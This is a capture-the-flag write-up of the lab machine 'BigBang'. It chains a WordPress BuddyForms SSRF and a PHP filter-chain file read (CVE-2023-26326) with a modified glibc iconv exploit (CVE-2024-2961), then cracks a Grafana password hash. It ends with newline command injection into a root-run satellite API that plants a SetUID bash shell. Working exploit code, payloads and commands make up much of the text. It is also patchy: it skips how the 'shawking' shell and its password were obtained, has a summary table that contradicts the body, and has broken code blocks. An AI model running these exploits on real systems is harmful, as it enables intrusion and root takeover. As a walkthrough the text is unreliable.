### üèÅ Summary of Attack Chain

| Step | User / Access | Technique Used                                 | Result                                                                                                                                                                                     |
| :--- | :------------ | :--------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | `N/A`         | **Port Enumeration**                           | Performed initial enumeration using `netstat` and `nmap`. Discovered several listening ports, notably `3000` (Grafana) and `9090` (Python-based Satellite App) only bound to `localhost`.  |
| 2    | `N/A`         | **Local Service Analysis**                     | Investigated Python processes and identified `/root/satellite/app.py` running on port `9090`. Found Grafana on port `3000`, redirecting to a login page.                                   |
| 3    | `N/A`         | **Grafana Database Extraction**                | Discovered `/opt/data/grafana.db` SQLite database. Retrieved the database remotely using `scp` for offline analysis.                                                                       |
| 4    | `N/A`         | **Grafana User Enumeration**                   | Enumerated the `user` table in the database. Found two users: `admin` and `developer`. Stored password hashes and salts were present.                                                      |
| 5    | `N/A`         | **Hash Cracking**                              | Used a custom script (`grafana2hashcat.py`) to convert hash+salt to Hashcat-compatible format. Successfully cracked the `developer` user's password: **bigbang**.                          |
| 6    | `developer`   | **Login via SSH**                              | Logged into the machine as `developer` using the cracked password. Also confirmed password worked for Grafana web interface login, retrieving a valid JWT access token.                    |
| 7    | `developer`   | **APK Exfiltration and Reversing**             | Located `satellite-app.apk` in `developer`‚Äôs home directory. Downloaded APK for analysis using jadx-gui. Identified hardcoded endpoints and authentication flows: `/login` and `/command`. |
| 8    | `developer`   | **API Authentication**                         | Reproduced the login request to `/login` endpoint and retrieved a valid Bearer token for API use.                                                                                          |
| 9    | `developer`   | **Command Injection via Newline**              | Identified that `output_file` parameter was vulnerable to newline injection. Successfully injected commands (e.g., `ping`) and confirmed network control.                                  |
| 10   | `root`        | **Privilege Escalation via Command Injection** | Executed a command injection to create a SetUID root bash shell: <br>`cp /bin/bash /tmp/0xdf` <br>`chmod 6777 /tmp/0xdf`. Used `/tmp/0xdf -p` to obtain an interactive root shell.         |
| 11   | `root`        | **Root Flag Retrieval**                        | Located and read the root flag: <br>`cat /root/root.txt` ‚Üí <br>`c3065984************************`.

Looking at the package versions, the OpenSSH version suggests Ubuntu 22.04 jammy, but the Apache version implies Debian bullsee or bookworm. Worth a guess that at least one of these is a container.

The website is redirecting to blog.bigbang.htb. Running ffuf to look for other subdomains returns only blog, so I‚Äôll add that and the base domain to my /etc/hosts file:

```
10.10.11.52 bigbang.htb blog.bigbang.htb
```

**blog.bigbang.htb - TCP 80**

Visiting the IP or bigbang.htb just redirects to blog.bigbang.htb, which is a site for a ‚Äúphysics university‚Äù:


There is a form to submit comments, but it POSTs data to / in a way that makes it look not implemented. None of the other links go anywhere.

Tech Stack
The page footer claims a WordPress site:


The form claims to be generated by a WordPress plugin, BuddyForms:


The HTTP response headers for the GET request for / show Apache and PHP:

```

There‚Äôs also an unusual Link header. The format of this header is defined here. The 404 page is the default Apache 404:

I‚Äôll skip directory brute force and run wpscan against the site. I‚Äôve signed up for a free researcher account and have my token stored in ~/.wpscan/scan.yml.

I‚Äôll hold off on the two XSS for now. The path traversal is authenticated and only on Windows.

There are two usernames identified:

There are a bunch of vulnerabilities in this plugin. The top one is most interesting, as it‚Äôs a PHAR vulnerability which likely means RCE.

---

# Shell as www-data in container

## Preview

This exploit involves using pieces from one vulnerability to enable another, and it is a bit complicated, so I‚Äôm going to show how it all fits together at the start of this section. I‚Äôll still walk through each bit showing how to find things, but this summary will help make it clear where the path is leading. I‚Äôll blur this section to not spoil for anyone working alongside this post.

### wrapwrap

* **CVE-2023-26326**
* **CVE-2024-2961**
* **Upload GIF**
* **PHAR**
* **SSRF**
* **File Read**
* **RCE**
* **Glibc Buffer Overflow**

CVE-2023-26326 is discussed as an RCE vulnerability via PHAR uploads, but the PHAR part won‚Äôt work on modern PHP.
However, the mechanism for uploading a remote file is an SSRF, and can be leveraged into local file read.
Once I have local file read, I can exploit CVE-2024-2961, a buffer overflow in GLIBC where I need to be able to read files from the box in order to build a payload.

---

## Failed Upload / PHAR RCE

### CVE-2023-26326 Background

CVE-2023-26326 is described as:

> The BuddyForms WordPress plugin, in versions prior to 2.7.8, was affected by an unauthenticated insecure deserialization issue. An unauthenticated attacker could leverage this issue to call files using a PHAR wrapper that will deserialize the data and call arbitrary PHP Objects that can be used to perform a variety of malicious actions granted a POP chain is also present.

There‚Äôs a way to get a serialized PHAR object onto the server and then reference it.
This post from Tenable TechBlog goes into much more detail.
They summarize the attack path in three steps:

1. Create a malicious phar file by making it look like an image.
2. Send the malicious phar file on the server.
3. Call the file with the `phar://` wrapper.

This exploit is using a PHAR file, which is a very flexible format allowing for many polyglots and other formats.
In Resource, Zipping, and UpDown, I showed how to upload Zip archives and access files within them using the `phar://` wrapper.

Unfortunately for me, the same strategy won‚Äôt work to get full RCE here, but it will provide some pieces that I can use.

---

## SSRF / File Upload

The POC in the post shows making a POST request to `/wp-admin/admin-ajax.php` passing a url.
I‚Äôll send a request to Burp Repeater and replace most of it.


If I send this without having an `example.gif` hosted on my Python webserver (or without the webserver running, which adds delay as the application tries to connect), it returns showing that the file type is not allowed:


That‚Äôs because an empty file / 404 page doesn‚Äôt match the magic bytes of the expected GIF file.
There is a request to my webserver, so that is an SSRF:

```
10.10.11.52 - - [30/Jan/2025 14:25:45] code 404, message File not found
10.10.11.52 - - [30/Jan/2025 14:25:45] "GET /example.gif HTTP/1.1" 404 -
```

If I grab a valid GIF image and host it, then the response shows that it uploads:


It does seem to rename the image into a PNG.
I can find the image at the given path (along with another previous upload, `1.png`):


The image is not reformatted, but still a raw GIF (despite the new extension):

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] curl http://blog.bigbang.htb/wp-content/uploads/2025/01/1-1.png -o- -s | xxd

```

---

## Image Type Bypass

In the POC post, the author talks about having a plugin installed that has an Evil class.
Their deserialization payload uses the function in Evil to get RCE.
This approach isn‚Äôt super realistic and assumes that there will be another set of gadgets I can find.
I can try that payload to see if it might work.
I‚Äôll create `evil.php` from the post:

```php
<?php

class Evil{
  public function __wakeup() : void {
    die("Arbitrary Deserialization");
  }
}

// create new Phar
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new Evil();
$phar->setMetadata($object);
$phar->stopBuffering();
```

And run it:

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] php --define phar.readonly=0 evil.php  

(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] file evil.phar  
evil.phar: GIF image data, version 89a, 15370 x 28735  
```

The resulting file is a GIF image by MIME type, but it‚Äôs also got the serialized PHP payload:

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] xxd evil.phar

00000000: 4749 4638 3961 0a3c 3f70 6870 205f 5f48  GIF89a.<?php __H

```

If I request `evil.phar` using the same upload as above, it works:


It is saving it as a PNG file, but the trick from here is to use the `phar://` filter to load it as PHP (without the extension mattering) and go from there.

# Failure to Weaponize

Typically to weaponize a deserialization attack against PHP, I would use **phpggc** to make a gadget from a framework installed on the target.
It doesn‚Äôt have any WordPress gadgets for version 6.5.4:

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] ./phpggc -l wordpress
```

Even if it did, I think there were changes in PHP8 that would block these kinds of attacks anyway.
A post I‚Äôll come to in the next section says:

> the target runs on PHP 8+, so it is not vulnerable to PHAR attacks.

I think it‚Äôs talking about this proposal, *‚ÄúPHP RFC: Don‚Äôt automatically unserialize Phar metadata outside getMetadata()‚Äù*, which includes:

> Any side effects from `__wakeup()`, `__destruct()`, etc. that were triggered during/after unserialization of metadata when the phar is loaded will stop happening, and will only happen when `getMetadata()` is directly called.

That is an end to this line of attack.

## glibc Buffer Overflow

### CVE-2024-2961

This post from Ambionics Security goes into a ton of detail about how a researcher found a 24-year-old buffer overflow in the iconv API in glibc by fuzzing PHP filters.
The bug was impossible to actually exploit, except via PHP!

The post explains in detail and ends with an example using it with **CVE-2023-26326** in BuddyForms v2.7.7:

That‚Äôs basically the exact same setup as BigBang (even with the same image on the website).

The vulnerability can be triggered by sending a series of PHP filters, but to calculate the data necessary for remote code execution, it must know portions of memory available in `/proc/self/maps`.
There is a POC skeleton that can be updated to reflect how to upload files and then access them, and then it will perform the rest of the exploit.

---

## Read GIF with file://

To make this work, I need to be able to read files.
I have CVE-2023-26326 which allows me to give WordPress a URL, and if it is a GIF, it copies that to the WordPress uploads folder.

I want to find a `.gif` file in the BigBang container to see if I can read it.
It‚Äôs easy enough to spin up a Docker container from the php family.
Since WordPress runs on Apache, there‚Äôs a container of the name/tag `php:<version>-apache`.
I‚Äôll run:

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] docker run -d php:8.3.2-apache
```

Output:

```
Unable to find image 'php:8.3.2-apache' locally
... [download progress] ...
Status: Downloaded newer image for php:8.3.2-apache
5323f1453a8b2e3857a1053e2cb39ffe7423f0a234366bcaa72b26103a9a66a8
```

Then:

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] docker exec -it 5323f1453a8b2e3857a1053e2cb39ffe7423f0a234366bcaa72b26103a9a66a8 bash
root@5323f1453a8b:/var/www/html#
```

Get the path of a GIF:

```bash
root@5323f1453a8b:/var/www/html# find / -name '*.gif' 2>/dev/null | head

/usr/share/apache2/icons/pie7.gif  
/usr/share/apache2/icons/tar.gif  
/usr/share/apache2/icons/link.gif  
/usr/share/apache2/icons/forward.gif  
/usr/share/apache2/icons/transfer.gif  
/usr/share/apache2/icons/broken.gif  
/usr/share/apache2/icons/alert.red.gif  
/usr/share/apache2/icons/burst.gif  
/usr/share/apache2/icons/pie1.gif  
/usr/share/apache2/icons/ball.red.gif  
```

![GIF Found](image-20250130171504266)

It works! That reads a file from the host system and copies it onto the webserver.

---

## Read With wrapwrap

Knowing that works, I‚Äôll try to read `/etc/hostname`:

![Attempt Hostname Read](image-20250130171652463)

It‚Äôs failing because the magic bytes for the file don‚Äôt match that of a GIF.

I can try things like filters to base64, but unless the resulting data starts with `GIF87a` or `GIF89a`, it‚Äôs going to return that same error.

The same author that found the buffer overflow in glibc had earlier written a tool named **wrapwrap** that uses PHP filters to prefix data.
In the example, if data is fetched and then parsed as JSON, you can prefix it with `{"<key>": "` and a suffix of `"}"` to get the data to process correctly.
Here, I can prepend the GIF magic bytes.

I‚Äôll use wrapwrap to append the six-byte magic to the front of `/etc/hosts`:

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] python wrapwrap.py /etc/hosts "GIF89a" "" 1000

[!] Ignoring nb_bytes value since there is no suffix  
[+] Wrote filter chain to chain.txt (size=1443).
```

Chain contents:

```
php://filter/convert.base64-encode|convert.iconv.855.UTF7|...|convert.base64-decode/resource=/etc/hosts
```

I‚Äôll pass that chain as the `url` parameter and send again:

![Chain Success](image-20250131065212064)

Now that file has the hosts file:

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] curl http://blog.bigbang.htb/wp-content/uploads/2025/01/1-7.png -o-
GIF89a127.0.0.1 localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3      bf9a078
```

It starts with the ‚ÄúGIF89a‚Äù which I can ignore.

---

I‚Äôm also suspicious of that hostname, which seems short for a Docker container.
I would have expected 12 characters, and it‚Äôs seven.
I think the last six characters (five missing in hostname plus trailing newline) might have been lost somehow in the filtering.
To test this, I‚Äôll re-run wrapwrap with a longer prefix:

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] python wrapwrap.py /etc/hosts "GIF89a0xdf" "" 1000
[!] Ignoring nb_bytes value since there is no suffix  
[+] Wrote filter chain to chain.txt (size=2619).
```

Chain contents:

```
php://filter/convert.base64-encode|...|convert.base64-decode/resource=/etc/hosts
```

After sending that, the resulting image has six more characters of prefix (not exactly sure why ‚ÄúMM‚Äù was added after ‚Äú0xdf‚Äù, but filters are weird), and six less characters of the file:

```bash
(myenv)‚îÄ(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] curl http://blog.bigbang.htb/wp-content/uploads/2025/01/1-8.png -o-
GIF89a0xdfMM127.0.0.1   localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3      b
```

This is worth keeping in mind for this file read that I seem to lose the trailing n characters, where n is the number of characters prepended.

I‚Äôll also note that if the filename changes but the prefix doesn‚Äôt, the chain from wrapwrap doesn‚Äôt change either, other than the end where it says `source=[filename]`.
This saves me from having to run it over and over.

## Modify Exploit

There‚Äôs a POC skeleton script here.
I‚Äôll download this and save it as `exploit.py`.
It‚Äôs using the Python ten exploitation framework, which uses classes and decorators to define the exploit.

## üõ† Modifying the Exploit

### ‚úÖ Updated Remote Class Methods

**`send()` function**:

```python
def send(self, path: str) -> Response:
    """Sends given `path` to the HTTP server. Returns the response."""
    url = f"{self.url}/wp-admin/admin-ajax.php"
    data = {
        "action": "upload_image_from_url",
        "url": tf.qs.encode(path),
        "id": 1,
        "accepted_files": "image/gif"
    }
    return self.session.post(url, data=data)
```

**`download()` function**:

```python
def download(self, path: str) -> bytes:
    """Returns the contents of a remote file."""
    gif_chain = "php://filter/convert.base64-encode|convert.iconv.855.UTF7|...|convert.base64-decode/resource="
    response = self.send(f"{gif_chain}{path}")
    url = response.json()["response"]
    if not url.startswith("http"):
        return b""
    content = self.session.get(url).content
    return content[6:]  # Remove GIF magic bytes prefix
```

---

### ‚úÖ Fix Test for Partial Result

```python
def check_token(text: str, path: str) -> bool:
    result = safe_download(path)
    return text.encode().startswith(result)  # Allow for truncation
```

---

### ‚úÖ Fix LIBC Download Padding

```python
def download_file(self, remote_path: str, local_path: str) -> None:
    """Downloads remote file and appends null bytes."""
    data = self.get_file(remote_path) + b"\x00" * 6
    Path(local_path).write_bytes(data)
```

---

### ‚úÖ Fix `get_regions()` for Decoding Issues

```python
def get_regions(self) -> list[Region]:
    """Obtains memory regions by reading /proc/self/maps."""
    maps = self.get_file("/proc/self/maps")
    maps = '\n'.join(maps.decode(errors='ignore').split('\n')[:-1])
    PATTERN = re.compile(
        r"^([a-f0-9]+)-([a-f0-9]+)\b.*\s([-rwx]{3}[ps])\s(.*)"
    )
    # Parsing logic continues...
```

## Shell as Developer

### Enumeration

#### Users

`shawking` cannot run sudo:

```bash
$ sudo -l
[sudo] password for shawking: 
Sorry, user shawking may not run sudo on bigbang.
```

There is another user with a home directory: `developer`.

```bash
$ ls /home
developer  shawking
```

From `/etc/passwd`, we see:

```bash
$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
shawking:x:1001:1001:Stephen Hawking,,,:/home/shawking:/bin/bash

#### Satellite App (Port 9090)

```bash
$ curl localhost:9090 -v
> GET / HTTP/1.1
< HTTP/1.1 404 NOT FOUND
< Server: Werkzeug/3.0.3 Python/3.10.12
```

Process list shows:

```bash
$ ps aux | grep python
root        1768  0.0  ... /usr/bin/python3 /root/satellite/app.py
```

#### Grafana (Port 3000)

```bash
$ curl -v localhost:3000
< HTTP/1.1 302 Found
< Location: /login
```

```bash
$ curl localhost:3000/login
<!DOCTYPE html> ... <title>Grafana</title> ...
```

Data located in `/opt/data/grafana.db`. Developer has access.

### Shell

#### Recover Grafana Password Hash

Copied database out:

```bash
$ sshpass -p 'quantumphysics' scp developer@bigbang.htb:/opt/data/grafana.db .
```

Extracted user table:

```sql
select * from user;
```

Reveals user `developer` with:

* login: developer
* hash: `7e8018a4...c59db93577b12201c0151256375d6f883f1b8d960`
* salt: `4umebBJucv`

Converted to hashcat format using `grafana2hashcat.py`.

Ran hashcat:

```bash
$ hashcat -m 10900 grafanahashes rockyou.txt
```

Discovered password:
`bigbang`

#### Access Developer Account

```bash
$ su - developer
Password: bigbang
developer@bigbang:~$
```

Also via SSH:

```bash
$ sshpass -p 'bigbang' ssh developer@bigbang.htb
developer@bigbang:~$
```

### Shell as Root

#### Enumeration

In developer home:

```bash
$ ls ~/android
satellite-app.apk
```

Downloaded the APK:

```bash
$ sshpass -p bigbang scp developer@bigbang.htb:~/android/satellite-app.apk .
```

#### APK Analysis

Used JADX GUI ‚Üí Found endpoints:

* `/login`
* `/command`

Communicates with `app.bigbang.htb:9090`.

#### Test Login Endpoint

Configured local tunnel:

```bash
$ ssh -L 9090:localhost:9090 shawking@bigbang.htb
```

Added to `/etc/hosts`:
`127.0.0.1 app.bigbang.htb`

Attempted login with wrong creds:

```bash
$ curl app.bigbang.htb:9090/login \
  -d '{"username": "0xdf", "password": "0xdf"}' \
  -H "Content-Type: application/json"
{"error":"Bad username or password"}
```

Then tested developer credentials:

```bash
$ token=$(curl -s app.bigbang.htb:9090/login \
  -d '{"username": "developer", "password": "bigbang"}' \
  -H "Content-Type: application/json" | jq -r .access_token)
```

#### Interact with /command Endpoint

Test without token:

```bash
$ curl -d '{"test": "1"}' -H "Content-Type: application/json" app.bigbang.htb:9090/command
{"msg":"Missing Authorization Header"}
```

Test with token:

```bash
$ curl -d '{"test": "1"}' -H "Content-Type: application/json" -H "Authorization: Bearer $token" app.bigbang.htb:9090/command
{"error":"Invalid command"}
```

Test valid command:

```bash
$ curl -d '{"command": "move", "x": 1, "y": 2, "z": 3}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token" \
  app.bigbang.htb:9090/command
{"status":"developer is moving to coordinates (1.0, 2.0, 3.0)"}
```

#### TakePictureActivity

```bash
$ curl -d '{"command": "send_image", "output_file": "test.png"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token" \
  app.bigbang.htb:9090/command
{"error":"Error generating image: "}
```


## Command Injection

### Bad Characters

When trying to inject a command via `output_file`, the server blocks dangerous characters:

```bash
$ curl app.bigbang.htb:9090/command \
  -d '{"command": "send_image", "output_file": "test.png; id"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token"
{"error":"Output file path contains dangerous characters"}
```

#### Fuzzing for Blocked Characters

Used `ffuf` to test for filtered characters:

```bash
$ ffuf -u http://app.bigbang.htb:9090/command \
  -d '{"command": "send_image", "output_file": "test.pngFUZZ"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token" \
  -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt \
  -mr dangerous
```

Blocked characters found:

```
' " % $ ) ( > # & ? ; < [ ] ^ ` { } |
```

### Newline Injection

Because the backend uses Python with `subprocess.run(..., shell=True)`, newline characters allow command injection:

```python
>>> subprocess.run("echo 'legit command'\nid", shell=True)
legit command
uid=1000(oxdf) gid=1000(oxdf) groups=1000(oxdf),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),117(lpadmin),984(docker),987(vboxsf)
```

#### Proof of Concept

Sent a ping command to my listener:

```bash
$ curl app.bigbang.htb:9090/command \
  -d '{"command": "send_image", "output_file": "test.png\nping -c 1 10.10.14.6"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token"
{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\nping -c 1 10.10.14.6'"}
```

Observed ICMP packets on my interface:

```bash
$ sudo tcpdump -ni tun0 icmp
20:49:41.327708 IP 10.10.11.52 > 10.10.14.6: ICMP echo request
20:49:41.327728 IP 10.10.14.6 > 10.10.11.52: ICMP echo reply
```

### Getting a Root Shell

Injected commands to copy bash and set it as SetUID:

```bash
$ curl app.bigbang.htb:9090/command \
  -d '{"command": "send_image", "output_file": "test.png\ncp /bin/bash /tmp/0xdf\nchmod 6777 /tmp/0xdf"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token"
{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\ncp /bin/bash /tmp/0xdf\\nchmod 6777 /tmp/0xdf'"}
```

Spawned a root shell:

```bash
$ /tmp/0xdf -p
0xdf-5.1#
```

Retrieved root flag:

```bash
$ cat /root/root.txt
c3065984************************
```
